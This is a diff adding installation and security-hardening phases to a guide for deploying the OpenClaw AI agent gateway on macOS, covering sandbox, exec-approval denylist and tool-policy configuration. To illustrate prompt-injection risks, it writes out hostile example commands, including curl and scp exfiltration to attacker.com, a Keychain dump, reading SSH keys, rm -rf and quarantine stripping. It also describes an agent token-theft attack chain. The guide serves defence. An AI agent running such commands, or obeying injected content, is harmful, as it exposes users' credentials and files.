@@ -509,3 +509,697 @@ npm --version
 - Notes / deviations / surprises:
 
 ---
+
+## Phase C: OpenClaw Installation
+
+**What we're doing:** Installing OpenClaw itself, running the onboarding wizard, and verifying the gateway runs as a persistent service.
+**Why it matters:** This is where the AI agent actually gets installed. The version check here is the single most important security gate in the entire deployment.
+**Time estimate:** 15-20 minutes.
+**Deeper context:** `knowledge-base/02-architecture/deep-dive-findings.md`
+
+### Understanding: What the Gateway Actually Is
+
+When you install OpenClaw, you're not installing a single application — you're installing an *architecture*. It has three internal layers that work together:
+
+**The Gateway** is the central nervous system. It manages sessions, queues messages, handles authentication, and maintains WebSocket connections with a 30-second heartbeat. Think of it as a traffic controller — every message from every channel (Telegram, Discord, web) flows through the gateway, gets routed to the right agent, and the response flows back. When we run `openclaw gateway install`, we're creating a `launchd` LaunchAgent — the macOS equivalent of Tim's `systemctl enable` on Linux. This means the gateway starts automatically on login and restarts if it crashes.
+
+**The Channel layer** is the adapter. Each messaging platform (Telegram, Discord, Slack) implements the same interface, converting platform-specific messages into a standard format. This is why you can configure Telegram today and add Discord later without changing the core setup.
+
+**The LLM layer** is pluggable — it was refactored in 2026 from hard-coded provider selection to a plugin system. When your agent receives a message, it sends the conversation context to the LLM provider (Anthropic, in our case), gets back a response (which may include tool calls), executes those tools in the sandbox, and returns the results.
+
+The critical thing to understand: **the gateway binds to a port (18789 by default)**. That port is how everything communicates. In Phase D, we'll lock that port down to localhost only — but right now, just know that `openclaw gateway install` creates a persistent service listening on that port.
+
+### C1: Install OpenClaw
+
+**Concept:** We install via npm (Node's package manager) for version control. The FIRST thing after installation is checking the version number. This is not a nice-to-have — it's a security gate.
+
+```bash
+# Install OpenClaw globally
+npm install -g openclaw@latest
+
+# IMMEDIATELY verify version — this is the #1 critical security check
+openclaw --version
+# Expected: >= 2026.1.29
+```
+
+**CRITICAL GATE — READ THIS:**
+
+If the version is less than 2026.1.29, **STOP**. Do not continue. Update with `npm install -g openclaw@latest` and check again.
+
+Why this matters: CVE-2026-25253 (disclosed February 2, 2026) is a CVSS 8.8 vulnerability — that's "High" severity. Here's how the attack works: an attacker sends you a crafted URL. If you click it, it exfiltrates your gateway auth token, disables the sandbox via the API, and executes arbitrary commands on your machine. Even localhost-bound instances are vulnerable because the attack uses *your own browser* as a bridge. It was patched in v2026.1.29.
+
+There's also CVE-2026-24763 (command injection in the Docker sandbox) patched in the same version.
+
+**Expected output:** Version >= 2026.1.29.
+
+**If something's wrong:**
+- Version too old: `npm install -g openclaw@latest`
+- npm permission errors: you may need to fix npm's global directory permissions or use `sudo npm install -g openclaw@latest` (from your admin account, not the openclaw user)
+
+### C2: Onboarding Wizard
+
+**Concept:** The onboarding wizard generates your initial configuration, sets up the gateway auth token, and connects your LLM provider. We're going to skip channel setup here — that comes after security hardening in Phase D.
+
+```bash
+# Run the onboard wizard
+openclaw onboard
+# Follow the prompts:
+# - API provider: Select "Anthropic"
+# - API key: Paste your Anthropic API key
+# - Model: Select Claude Opus 4.6 (recommended for prompt injection resistance)
+# - Gateway token: Let it generate one (SAVE THIS — you'll need it later)
+# - Channel: SKIP for now (we configure channels AFTER security hardening)
+```
+
+**Watch for macOS permission dialogs (Open Question #2):**
+
+During onboarding, macOS may pop up permission request dialogs (TCC — Transparency, Consent, and Control). The macOS companion app has been reported to request: Notifications, Accessibility, Screen Recording, Microphone, Speech Recognition, and Automation/AppleScript permissions.
+
+**Your response to each dialog:**
+- **Notifications: APPROVE** — needed for exec-approval prompts
+- **Screen Recording: DENY** — not needed for a headless server
+- **Microphone / Speech Recognition: DENY** — not needed
+- **Accessibility: INVESTIGATE** — may be needed for system automation, but deny first and see if anything breaks
+- **Keychain access: DENY** — and note what triggered it
+
+**Screenshot every dialog you see.** This is one of our open questions — documenting what actually happens on a fresh M4 Mac Mini helps future walkthroughs.
+
+**Expected output:** Configuration files created in `~/.openclaw/`.
+
+### C3: Verify Gateway via launchd
+
+**Concept:** On Tim's Linux VPS, the gateway ran as a `systemd` service. On macOS, we use `launchd` — Apple's service management system. A LaunchAgent is a service that runs when a user logs in and stays running. When we run `openclaw gateway install`, it creates a `.plist` file (Apple's XML configuration format) in `~/Library/LaunchAgents/`.
+
+```bash
+# Install the gateway as a LaunchAgent
+openclaw gateway install
+
+# Verify the LaunchAgent is loaded
+launchctl list | grep molt
+# Expected: Shows "bot.molt.gateway" with a PID (process ID number)
+
+# Verify the gateway is actually responding
+curl -s http://127.0.0.1:18789/health
+# Expected: HTTP 200 or JSON health response
+
+# Check where the LaunchAgent plist lives
+ls -la ~/Library/LaunchAgents/bot.molt.gateway.plist
+# Expected: File exists
+
+# Verify it's configured to start on login
+launchctl print gui/$UID/bot.molt.gateway
+# Look for: "state = running"
+```
+
+**Expected output:** Gateway is running, responds to health check, LaunchAgent is loaded.
+
+**If something's wrong:**
+- "service not found" in launchctl: the install didn't create the plist. Try `openclaw gateway install` again, check for error messages
+- Health check fails: check logs at `/tmp/openclaw/openclaw-$(date +%Y-%m-%d).log`
+- If running under the dedicated `openclaw` user and it doesn't work: this is Open Question #4. The fallback is running under your admin account with strict file permissions
+
+**Important note about the dedicated user:** LaunchAgents only load when the user has a login session. If you're running under the `openclaw` user, that user needs to be "logged in" (even headless). This may require enabling auto-login for the openclaw user or using a LaunchDaemon instead. Note what you discover here.
+
+### Phase C — Deployment Notes
+
+*Fill this in during deployment:*
+
+- [ ] OpenClaw version installed: ___
+- [ ] Version >= 2026.1.29 confirmed?
+- [ ] Onboarding wizard completed?
+- [ ] Gateway auth token saved securely?
+- [ ] TCC/Keychain dialogs encountered? (List them)
+- [ ] Gateway running via launchd?
+- [ ] Health check passed?
+- [ ] Running under which user? (openclaw / admin)
+- Notes / deviations / surprises:
+
+---
+
+## Phase D: Security Hardening
+
+**What we're doing:** Locking down every attack surface on the OpenClaw installation before it touches any messaging channel.
+
+**Why it matters:** The default OpenClaw configuration is dangerously permissive. A critical RCE vulnerability (CVE-2026-25253, CVSS 8.8) was disclosed just days ago, 12% of ClawHub skills are confirmed malicious, and 88% of organizations running AI agents reported security incidents in the past year. None of this means "don't deploy" — it means "harden first, connect second, and understand every layer."
+
+**Time estimate:** 30-45 minutes.
+
+**Deeper context:** `knowledge-base/03-security/security-posture-analysis.md`
+
+---
+
+### Understanding: Defense in Depth — Why This Order Matters
+
+Out of the box, OpenClaw is designed for developer convenience, not production safety. The gateway binds to loopback (good), but sandbox mode is off, elevated mode is available, mDNS broadcasts your hostname and SSH port to the local network, tool permissions are wide open, and there are no execution approval controls. If you connected Telegram right now, any prompt injection embedded in content the agent reads — an email, a web page, a document — could trigger arbitrary tool calls with your user's full filesystem access. That is the starting position.
+
+The defense-in-depth principle means no single control is trusted to be sufficient. We are building overlapping layers: gateway authentication prevents unauthorized WebSocket connections, sandbox isolation contains tool execution in disposable Docker containers, exec-approvals block dangerous commands even if the sandbox is bypassed, tool policies restrict which tools are available at all, and file permissions protect credentials on disk. If any one layer fails, the others still hold. The CVE-2026-25253 attack chain is a perfect illustration — it chained together auth token theft, exec-approvals override, and sandbox escape. Each of those should have been a dead end. With proper hardening, at least two of those three steps would have failed.
+
+The order within this phase is also intentional. We configure the gateway first (the outermost boundary), then sandbox (the execution boundary), then exec-approvals (the command-level boundary), then tool policy (the capability boundary), then audit (the verification step), then file permissions (the at-rest protection). Outside-in, coarse to fine.
+
+And critically: this entire phase happens BEFORE Phase F (channel connection). The moment you connect Telegram, the agent has an inbound attack surface. Every message, every piece of content it reads, every URL it fetches is a potential prompt injection vector. The security controls in this phase are what stand between that inbound content and your filesystem, credentials, and API keys. Connecting a channel without completing Phase D is equivalent to opening a port with no firewall — technically functional, operationally reckless.
+
+---
+
+### D1: Gateway Configuration
+
+The gateway is the WebSocket server that bridges messaging channels to the agent. It is the outermost network boundary of your OpenClaw installation. Every setting here controls who and what can connect to it.
+
+Edit `~/.openclaw/openclaw.json`:
+
+```json5
+// ~/.openclaw/openclaw.json
+{
+  "gateway": {
+    "mode": "local",
+    "bind": "loopback",            // CRITICAL: localhost only — prevents Shodan exposure
+    "port": 18789,
+    "auth": {
+      "mode": "token",
+      "token": "YOUR-64-CHAR-RANDOM-TOKEN"  // Generated during onboard, or regenerate:
+      // openclaw doctor --generate-gateway-token
+    },
+    "controlUi": {
+      "allowInsecureAuth": false   // NEVER enable — CVE-2026-25253 exploited this pattern
+    }
+  },
+  "discovery": {
+    "mdns": { "mode": "off" }      // Disable Bonjour broadcasting entirely
+  },
+  "channels": {
+    "telegram": {
+      "dmPolicy": "pairing",       // Require pairing for DMs
+      "groups": {
+        "*": { "requireMention": true }  // Only respond when @mentioned in groups
+      }
+    }
+  },
+  "session": {
+    "dmScope": "per-channel-peer"  // Isolate DM sessions per sender
+  },
+  "logging": {
+    "redactSensitive": "tools"     // Keep tool output redaction on
+  }
+}
+```
+
+Here is what each setting defends against and why it matters:
+
+| Setting | Defends Against | Explanation |
+|---------|----------------|-------------|
+| `bind: "loopback"` | Network exposure (Shodan scanning) | Researcher @fmdz387 found ~1,000 publicly accessible OpenClaw instances on Shodan, many running without auth. Loopback bind means the gateway only listens on 127.0.0.1 — it physically cannot accept connections from the network. With Tailscale handling remote access, there is zero reason to bind wider. Source: Kaspersky (Tier 2) |
+| `auth.mode: "token"` | Unauthorized WebSocket connections | Fail-closed: the gateway refuses any WebSocket connection that does not present a valid token. This is the setting that CVE-2026-25253 ultimately targeted — the attack chain stole the auth token via a crafted URL. The token itself is generated during onboarding or via `openclaw doctor --generate-gateway-token`. Source: docs.openclaw.ai (Tier 1) |
+| `controlUi.allowInsecureAuth: false` | CVE-2026-25253 (1-click RCE, CVSS 8.8) | The CVE-2026-25253 kill chain exploited instances where insecure auth patterns were permitted. This setting ensures the control UI requires proper authentication. There is no legitimate use case for enabling it. Source: SOCRadar (Tier 1) |
+| `mdns.mode: "off"` | LAN reconnaissance | OpenClaw broadcasts `_openclaw-gw._tcp` via Bonjour, including filesystem paths, SSH port, and hostname. On a home network this is information disclosure to any device on the LAN. Disabling it is covered more thoroughly in D5. Source: docs.openclaw.ai (Tier 1) |
+| `dmPolicy: "pairing"` | Unauthorized DM access | Only contacts you have explicitly paired can send DMs to the bot. Without this, anyone who discovers the bot's Telegram handle can message it. Source: docs.openclaw.ai (Tier 1) |
+| `requireMention: true` | Bot responding to every group message | Without this, the agent processes every message in every group it is added to — each one a potential prompt injection vector. With it, the agent only activates when directly @mentioned. Source: docs.openclaw.ai (Tier 1) |
+| `dmScope: "per-channel-peer"` | Session cross-contamination | Each sender gets their own isolated session. Without this, session state could leak between different conversations. Source: docs.openclaw.ai (Tier 1) |
+| `redactSensitive: "tools"` | Credential leakage in logs | Tool output often contains API keys, tokens, and other secrets. This setting redacts sensitive values from log files so a log exposure does not become a credential exposure. Source: docs.openclaw.ai (Tier 1) |
+
+**Expected output:** No command to run here — this is a config file edit. You will validate the full configuration in D7 with the security audit.
+
+**If something's wrong:** If `openclaw.json` does not exist yet, you have not completed Phase C (onboarding). The onboarding wizard creates this file with sensible defaults. Go back to Phase C. If the file exists but uses a different structure, check your OpenClaw version — the config schema has evolved across releases.
+
+---
+
+### D2: Sandbox Configuration
+
+Without sandboxing, every tool call the agent makes runs with your full user permissions on the host filesystem. If the agent is tricked into running `cat ~/.ssh/id_rsa`, it succeeds. If it runs `rm -rf ~/Documents`, it succeeds. Sandboxing wraps each tool execution in a disposable Docker container with no network access, a read-only root filesystem, all Linux capabilities dropped, and a non-root user. Even if a prompt injection gets the agent to attempt something destructive, the blast radius is contained to an ephemeral container that gets destroyed when the session ends.
+
+**Docker prerequisite:** Sandboxing requires Docker. If Docker is not already installed:
+
+```bash
+brew install --cask docker
+# Launch Docker Desktop, accept the terms
+# Verify:
+docker --version && docker run hello-world
+```
+
+Add to `~/.openclaw/openclaw.json`:
+
+```json5
+{
+  "agents": {
+    "defaults": {
+      "sandbox": {
+        "mode": "all",             // Sandbox ALL sessions — not just non-main
+        "scope": "session",        // Per-session isolation (strictest)
+        "workspaceAccess": "none", // No access to agent workspace from sandbox
+        "workspaceRoot": "~/.openclaw/sandboxes",
+        "docker": {
+          "image": "openclaw-sandbox:bookworm-slim",
+          "readOnlyRoot": true,
+          "tmpfs": ["/tmp", "/var/tmp", "/run"],
+          "network": "none",       // No network access from sandbox
+          "user": "1000:1000",     // Non-root user inside container
+          "capDrop": ["ALL"],      // Drop all Linux capabilities
+          "pidsLimit": 256,
+          "memory": "1g",
+          "memorySwap": "2g",
+          "cpus": 1
+        }
+      }
+    }
+  }
+}
+```
+
+Walking through the key settings:
+
+- **`mode: "all"`** — Sandboxes every session, including the main one. The alternative `"non-main"` only sandboxes sessions from non-primary agents, which leaves your primary attack surface (the main agent processing Telegram messages) unsandboxed. That defeats the purpose.
+- **`scope: "session"`** — Each conversation gets its own isolated container. The alternative `"agent"` shares a single container across all sessions for a given agent, which means a compromised session could affect other sessions. Per-session is the strictest option.
+- **`workspaceAccess: "none"`** — The sandbox cannot access the agent's workspace directory. This prevents a sandboxed tool from reading or modifying agent configuration files.
+- **`network: "none"`** — No network access from inside the sandbox. If a prompt injection tricks the agent into running `curl attacker.com/exfil?data=...`, it fails because DNS resolution and outbound connections are blocked at the container level.
+- **`readOnlyRoot: true`** — The container's root filesystem is mounted read-only. The agent can only write to tmpfs mounts (`/tmp`, `/var/tmp`, `/run`), which are ephemeral and disappear when the container stops.
+- **`capDrop: ["ALL"]`** — Drops every Linux capability. No `CAP_NET_RAW` (no raw socket access), no `CAP_SYS_ADMIN` (no mount/namespace manipulation), no `CAP_DAC_OVERRIDE` (no bypassing file permissions). The container process has the absolute minimum kernel privileges.
+- **`pidsLimit: 256`** and **`memory: "1g"`** — Resource limits prevent a fork bomb or memory exhaustion attack from inside the sandbox from affecting the host.
+
+**Open Question #3 (monitor during Phase G):** Docker Desktop for Mac runs Linux containers inside a lightweight VM, not natively. On a 16GB machine, this adds overhead — the VM itself consumes memory, and each per-session container adds more. During Phase G testing, watch Activity Monitor. If memory pressure becomes a problem, the fallback is relaxing `scope` from `"session"` to `"agent"` (per-agent isolation instead of per-session). This is less strict but dramatically reduces container count. Source: `research/reports/05-open-questions.md` question 3.
+
+**If you choose NOT to use Docker sandbox:** If Docker proves impractical on 16GB (you will know during Phase G testing), the fallback is host-level restrictions only:
+
+```json5
+{
+  "agents": {
+    "defaults": {
+      "sandbox": {
+        "mode": "off"  // Only if Docker is impractical on 16GB
+      }
+    }
+  }
+}
+```
+
+If you take this path, steps D3 (exec-approvals) and D6 (tool policy) become your ONLY execution boundaries instead of additional layers. The margin for error shrinks significantly. Do not take this path unless Docker is genuinely causing resource problems — and even then, try `scope: "agent"` first.
+
+**Expected output:** No immediate output. The sandbox configuration takes effect when the gateway restarts. You will validate it in D7.
+
+**If something's wrong:** If Docker Desktop fails to start, check that virtualization is enabled (it is by default on M4 Mac Mini) and that you have accepted Docker's terms of service. If `docker run hello-world` fails, Docker is not running. If it works but OpenClaw sandbox fails later, check that the `openclaw-sandbox:bookworm-slim` image exists (`docker images | grep openclaw-sandbox`). OpenClaw should pull it automatically, but if it does not, check `openclaw doctor` output.
+
+---
+
+### D3: exec-approvals.json
+
+This is one of the most important security controls in the entire deployment, and Tim did not mention it at all in his video. The execution approvals system is the macOS companion app's mechanism for requiring user confirmation before running privileged commands. It is a command-level allowlist/denylist that sits between the agent's intent and actual execution on the host.
+
+Think of it this way: the sandbox (D2) contains WHERE commands run. Exec-approvals controls WHICH commands can run at all. Even if the sandbox is bypassed or disabled, the denylist still blocks dangerous commands. Even if a prompt injection convinces the agent to try `sudo rm -rf /`, the exec-approvals system rejects it before it reaches a shell.
+
+Create `~/.openclaw/exec-approvals.json`:
+
+```json
+{
+  "version": 1,
+  "defaults": {
+    "security": "deny",
+    "ask": "on-miss"
+  },
+  "agents": {
+    "main": {
+      "security": "allowlist",
+      "ask": "on-miss",
+      "allowlist": [
+        { "pattern": "/opt/homebrew/bin/rg" },
+        { "pattern": "/opt/homebrew/bin/git" },
+        { "pattern": "/usr/bin/curl" },
+        { "pattern": "/usr/bin/cat" },
+        { "pattern": "/bin/ls" },
+        { "pattern": "/usr/bin/wc" },
+        { "pattern": "/opt/homebrew/bin/jq" }
+      ],
+      "denylist": [
+        { "pattern": "/usr/bin/security" },
+        { "pattern": "xattr" },
+        { "pattern": "rm -rf" },
+        { "pattern": "chmod" },
+        { "pattern": "sudo" },
+        { "pattern": "dd" },
+        { "pattern": "scp" },
+        { "pattern": "rsync" },
+        { "pattern": "find /" },
+        { "pattern": "find ~" }
+      ]
+    }
+  }
+}
+```
+
+The structure has two layers. The `defaults` section sets the global posture: `"security": "deny"` means anything not explicitly allowed is blocked, and `"ask": "on-miss"` means if a command is not in any list, the system prompts you for approval rather than silently blocking or silently allowing. This is fail-closed with a human checkpoint.
+
+The `allowlist` contains the specific commands the agent can run without asking. These are all read-only information-gathering tools: `rg` (ripgrep for searching), `git` (version control), `curl` (fetching URLs), `cat` (reading files), `ls` (listing directories), `wc` (counting lines/words), `jq` (parsing JSON). Note the full paths — `/opt/homebrew/bin/rg` not just `rg`. This prevents PATH manipulation attacks.
+
+The `denylist` is where the real defense lives. Here is what each entry blocks and why:
+
+| Pattern | What It Blocks | Why It's Dangerous |
+|---------|---------------|-------------------|
+| `/usr/bin/security` | macOS Keychain CLI | This is the command-line interface to macOS Keychain. An agent (or a prompt injection) running `security find-generic-password -s "Anthropic"` could dump stored API keys. A Reddit user reported unexpected Keychain access dialogs from ClawdBot — this is the command that would trigger them. Source: reddit r/ClaudeAI (Tier 4) |
+| `xattr` | Gatekeeper bypass | Malicious ClawHub skills have been observed running `xattr -d com.apple.quarantine` to strip the quarantine flag from downloaded files, bypassing macOS Gatekeeper protection. This is a known technique in the ClawHavoc campaign. Source: Semgrep (Tier 2), Koi Security (Tier 2) |
+| `rm -rf` | Destructive file deletion | Self-explanatory, but worth noting: an agent tricked into running `rm -rf ~/` would destroy your home directory. This is not hypothetical — the "Find the Truth" social engineering test demonstrated agents willingly exploring and modifying the filesystem when prompted with minimal persuasion. |
+| `chmod` | Permission modification | Could be used to make restricted files world-readable (exposing credentials) or make files executable (enabling downloaded malware to run). |
+| `sudo` | Privilege escalation | Any `sudo` command runs as root. An agent should never need root access. If it asks for sudo, something is wrong. |
+| `dd` | Raw disk access | `dd` can read/write raw disk blocks, image entire drives, and overwrite boot sectors. There is no legitimate agent use case. |
+| `scp` / `rsync` | File exfiltration | Both commands can copy files to remote hosts. A prompt injection that gets the agent to run `scp ~/.openclaw/credentials/* attacker.com:` would exfiltrate all stored credentials. |
+| `find /` / `find ~` | Full filesystem enumeration | This entry deserves special attention. It comes from a real incident: an agent was asked to run `find ~` and proceeded to dump the entire home directory structure into a group chat. Every file path, every directory name, every hidden folder — visible to every member of that group. File paths leak information: project names, client names, financial directories, SSH key locations. The `find /` variant is even worse — it maps the entire filesystem. Source: Kaspersky (Tier 2) |
+
+Set permissions on the file:
+
+```bash
+chmod 600 ~/.openclaw/exec-approvals.json
+```
+
+**Expected output:** No output from `chmod` on success.
+
+**Open Question #5 (test during Phase H):** The pattern matching behavior for the denylist is not documented. Does denying `rm -rf` also block `rm -r -f`? Does it block `/bin/rm -rf`? Does `find ~` block `find ~/Documents`? The safe assumption is that it does exact substring matching, but this needs hands-on testing with harmless variations during Phase H validation. If the matching is too literal, you may need to add additional patterns to cover common evasions. Source: `research/reports/05-open-questions.md` question 5.
+
+**If something's wrong:** If exec-approvals are not being enforced, verify the file is at `~/.openclaw/exec-approvals.json` (exact path, exact filename). Verify permissions are `600`. Restart the gateway after creating the file. If commands on the denylist still execute, check that the `version` field is `1` (not `0` or missing) and that the agent ID in the config matches your actual agent ID (`main` is the default).
+
+---
+
+### D4: Disable Elevated Mode
+
+Elevated mode is OpenClaw's global escape hatch. When enabled, it allows authorized senders to execute commands directly on the host machine, completely bypassing the Docker sandbox. The official docs themselves warn: "Keep `tools.elevated.allowFrom` tight and don't enable it for strangers."
+
+For our deployment, the correct answer is simpler: disable it entirely.
+
+The reasoning is straightforward. Elevated mode is a single boolean that punctures your entire sandboxing layer. The `allowFrom` lists are static — no time-based restrictions, no context-based restrictions, no per-command granularity. If a prompt injection tricks the agent into believing it needs to run something on the host, and the sender is on the `allowFrom` list, it executes. The sandbox you carefully configured in D2 becomes irrelevant for that call.
+
+Add to `~/.openclaw/openclaw.json`:
+
+```json5
+{
+  "tools": {
+    "elevated": {
+      "enabled": false             // DISABLE entirely — no escape hatch
+    }
+  }
+}
+```
+
+**The better architecture (Pattern 002):** If you later find you genuinely need some tasks to run on the host (outside the sandbox), do not re-enable elevated mode. Instead, use OpenClaw's multi-agent architecture with per-agent routing. Create a restricted agent for most interactions and a separate, less-restricted agent for specific trusted use cases. Each agent gets its own sandbox config, tool permissions, and session isolation. Route messages to agents based on channel and sender using the bindings system. This gives you the same capability as elevated mode but with architectural isolation instead of a global escape hatch. See `patterns/002-per-agent-routing-over-elevated-mode.md` for the full pattern and configuration example.
+
+**Expected output:** No immediate output. Takes effect on gateway restart.
+
+**If something's wrong:** If you later discover the agent is executing commands on the host despite sandbox being enabled, check for `elevated.enabled: true` anywhere in the config (it may have been set during onboarding). Also check for `elevated.allowFrom` arrays — if these exist with entries, elevated mode may be partially active even without the explicit `enabled` flag. Remove all `elevated` configuration except `enabled: false`.
+
+---
+
+### D5: Disable mDNS Broadcasting
+
+OpenClaw uses Apple's Bonjour (mDNS) to advertise its presence on the local network under the service type `_openclaw-gw._tcp`. What gets broadcast: the gateway's filesystem path (revealing your directory structure), the SSH port (revealing how to connect), and the hostname (identifying the machine). For any device on your local network — a compromised IoT device, a guest's laptop, anything — this is free reconnaissance.
+
+We already set `discovery.mdns.mode: "off"` in the D1 gateway configuration. This step adds a belt-and-suspenders environment variable to ensure mDNS is disabled even if the config file setting is somehow not read:
+
+```bash
+# Add to shell profile (use whichever shell the openclaw user runs)
+# For zsh (macOS default):
+echo 'export OPENCLAW_DISABLE_BONJOUR=1' >> ~/.zshrc
+
+# For bash:
+echo 'export OPENCLAW_DISABLE_BONJOUR=1' >> ~/.bash_profile
+```
+
+After adding the environment variable, verify that mDNS is actually off. Restart the gateway first (so it picks up the config change), then probe for the service:
+
+```bash
+# Search for the mDNS service
+dns-sd -B _openclaw-gw._tcp
+# Expected: Should find nothing (wait 5-10 seconds then Ctrl+C)
+# If it appears, the config did not take effect — investigate
+```
+
+**Expected output:** `dns-sd -B` should sit silently, discovering nothing. If you see a line like `_openclaw-gw._tcp.  local.  OpenClaw Gateway`, the broadcast is still active and you need to investigate why the config or environment variable is not being picked up.
+
+**If something's wrong:** If mDNS is still broadcasting after setting both the config and environment variable: (1) verify the gateway was fully restarted after the config change, (2) verify the environment variable is in the correct shell profile for the user running the gateway, (3) check if there is a system-level mDNS responder advertising the service independently of OpenClaw's config. On macOS, `sudo launchctl list | grep -i mdns` can help identify mDNS-related services.
+
+---
+
+### D6: Tool Policy — Initial Allow/Deny
+
+This step controls which tools the agent has access to at all. Think of the sandbox (D2) as the execution environment, exec-approvals (D3) as the command filter, and this tool policy as the capability gate. Even if the sandbox allows execution and exec-approvals allow a specific command, the agent cannot use a tool that is not on the allow list.
+
+The philosophy for day one is simple: **read-only**. The agent can search the web, read files, react to messages, and check its own session status. It cannot write files, execute arbitrary commands, control a browser, schedule tasks, or modify anything. This lets you observe the agent's behavior through Telegram — what it tries to do, what it asks for, how it responds to various inputs — before granting any write or execute capabilities.
+
+Add to `~/.openclaw/openclaw.json`:
+
+```json5
+{
+  "tools": {
+    "allow": [
+      "read",              // Read files (information disclosure only)
+      "web_search",        // Search the web (read-only)
+      "web_fetch",         // Fetch URLs (read-only, SSRF protected)
+      "reactions",         // Emoji reactions (cosmetic)
+      "thinking",          // Control thinking depth (model parameter only)
+      "sessions_list",     // List sessions
+      "sessions_history",  // Read session history
+      "session_status"     // Check session status
+    ],
+    "deny": [
+      "browser",           // Full CDP browser control — operator-level access
+      "canvas",            // UI rendering — not needed headless
+      "nodes",             // Device pairing — unnecessary complexity
+      "cron",              // Scheduled tasks — enable in Week 1-2
+      "discord",           // Not using Discord
+      "exec",              // Arbitrary command execution — enable in Week 1-2 with exec-approvals
+      "process",           // Background process management — enable later
+      "write",             // File creation — enable in Week 1-2
+      "edit",              // File modification — enable in Week 1-2
+      "apply_patch"        // Patch application — enable in Week 1-2
+    ],
+    "elevated": {
+      "enabled": false
+    }
+  }
+}
+```
+
+Walking through the allow list:
+
+- **`read`** — The agent can read files you point it to. This is information disclosure only — it can see content but not change it. Useful for having the agent review documents, check logs, or read configuration files.
+- **`web_search`** and **`web_fetch`** — The agent can search the web and fetch URLs. Both are read-only operations. `web_fetch` has built-in SSRF (Server-Side Request Forgery) protection from OpenClaw's security engine, so the agent cannot be tricked into fetching internal network resources. Note: even though these are read-only, they are still prompt injection vectors — content the agent reads from the web can contain adversarial instructions. This is where the reader agent pattern (`patterns/003-reader-agent-prompt-injection-defense.md`) becomes relevant in Phase 2.
+- **`reactions`**, **`thinking`**, **`sessions_*`** — Cosmetic and informational tools. Zero security risk.
+
+Walking through the deny list:
+
+- **`browser`** — Full Chrome DevTools Protocol control. If enabled, the agent has access to every logged-in session in the browser profile. The official docs recommend a dedicated browser profile if you ever enable this. For day one, it stays off.
+- **`exec`** — Arbitrary command execution. This is the tool that the exec-approvals system (D3) governs. Even when you enable `exec` in Week 1-2, the exec-approvals denylist is the safety net. But for day one, double-deny it: removed from the allow list AND present on the deny list.
+- **`cron`** — Scheduled tasks. This allows the agent to set up autonomous actions that run on a schedule. Powerful, but also means the agent can do things without you asking. Enable only after you trust the agent's behavior.
+- **`write`**, **`edit`**, **`apply_patch`** — All write operations. Keeping these off means the agent literally cannot modify your filesystem. It can tell you what it would change, but it cannot change it.
+
+**Expected output:** No immediate output. Takes effect on gateway restart.
+
+**If something's wrong:** If the agent seems unable to use allowed tools, check that your allow and deny lists do not conflict (a tool on both lists will be denied). If the agent uses tools you thought were denied, restart the gateway — config changes require a restart to take effect. Run `openclaw security audit` (D7) to verify the tool policy is being enforced as expected.
+
+---
+
+### D7: Run Security Audit
+
+OpenClaw ships with a built-in security audit tool that checks your configuration against known security best practices. It examines inbound access policies, tool blast radius, network exposure, browser control, disk hygiene, plugins, and model selection. After completing D1-D6, this audit validates that your hardening actually took effect.
+
+```bash
+# Basic audit — checks configuration against security best practices
+openclaw security audit
+# Expected: Should pass all checks given our hardening config
+
+# Deep audit — actively probes the running gateway
+openclaw security audit --deep
+# This sends test requests to the gateway to verify auth enforcement,
+# checks that loopback bind is working, and validates sandbox configuration
+
+# Auto-fix any common issues found
+openclaw security audit --fix
+# Applies automatic fixes for known misconfigurations
+```
+
+Run all three in sequence. Start with the basic audit, read every finding, then run the deep audit, then apply auto-fixes for anything that was flagged.
+
+**Expected output:** With the hardening configuration from D1-D6 in place, the basic audit should pass all checks. The deep audit may surface additional findings related to the live gateway state. Pay attention to any findings rated "high" or "critical" — those need resolution before proceeding to Phase E.
+
+**If something's wrong:** If the audit flags issues you believe you already addressed, the most common cause is that the gateway has not been restarted since the config changes. Restart it (`launchctl kickstart -k gui/$UID/bot.molt.gateway` or equivalent) and re-run the audit. If the audit flags something you do not understand, document it — do not ignore it and do not proceed to Phase E until you understand every finding.
+
+---
+
+### D8: Lock Down File Permissions
+
+Everything OpenClaw stores — API keys, gateway auth tokens, session transcripts, chat history, agent configurations — lives unencrypted on disk under `~/.openclaw/`. The Unix permission model is the last line of defense for data at rest. Setting `600` (owner read/write only) on files and `700` (owner read/write/execute only) on directories ensures that no other user account on the machine, and no other process running under a different user, can read your credentials or chat transcripts.
+
+This matters even on a single-user machine. If any other service is compromised — a web server, a development tool, anything running under a different user — it cannot read your OpenClaw data. It also matters for backup software, spotlight indexing, and any process that scans the filesystem.
+
+```bash
+# Lock down OpenClaw state directory
+chmod 700 ~/.openclaw
+chmod 600 ~/.openclaw/openclaw.json
+chmod 600 ~/.openclaw/exec-approvals.json
+
+# Lock down credentials directory (if it exists after onboarding)
+if [ -d ~/.openclaw/credentials ]; then
+    chmod 700 ~/.openclaw/credentials
+    find ~/.openclaw/credentials -type f -exec chmod 600 {} \;
+fi
+
+# Lock down agent auth profiles
+find ~/.openclaw/agents -name "auth-profiles.json" -exec chmod 600 {} \; 2>/dev/null
+
+# Lock down session transcripts
+find ~/.openclaw/agents -name "*.jsonl" -exec chmod 600 {} \; 2>/dev/null
+
+# Lock down the LaunchAgent plist (contains no secrets, but principle of least access)
+chmod 600 ~/Library/LaunchAgents/bot.molt.gateway.plist
+
+# Verify permissions
+ls -la ~/.openclaw/
+ls -la ~/.openclaw/openclaw.json
+ls -la ~/.openclaw/exec-approvals.json
+```
+
+**Expected output:** The `ls -la` commands should show permissions like:
+
+```
+drwx------  openclaw  staff  ~/.openclaw/
+-rw-------  openclaw  staff  ~/.openclaw/openclaw.json
+-rw-------  openclaw  staff  ~/.openclaw/exec-approvals.json
+```
+
+The key indicators: `drwx------` for directories (700) and `-rw-------` for files (600). No group or other permissions. If you see anything like `-rw-r--r--` (644) or `drwxr-xr-x` (755), those files are readable by other users and the permissions were not applied correctly.
+
+**If something's wrong:** If `chmod` fails with "Operation not permitted," you may be trying to modify files owned by a different user. Check ownership with `ls -la` and use `sudo chown $(whoami)` if needed. If the `find` commands produce errors about missing directories, that is fine — those directories may not exist yet if you have not completed onboarding. They will be created later, and you should re-run the permission lockdown after Phase E (onboarding).
+
+---
+
+### Phase D — Deployment Notes
+
+Use this checklist during deployment. Check each item as you complete it, and note anything unexpected.
+
+- [ ] D1: Gateway config applied (`openclaw.json` — loopback bind, token auth, mDNS off, DM pairing, require mention, session isolation, log redaction)
+  - Notes: _______________
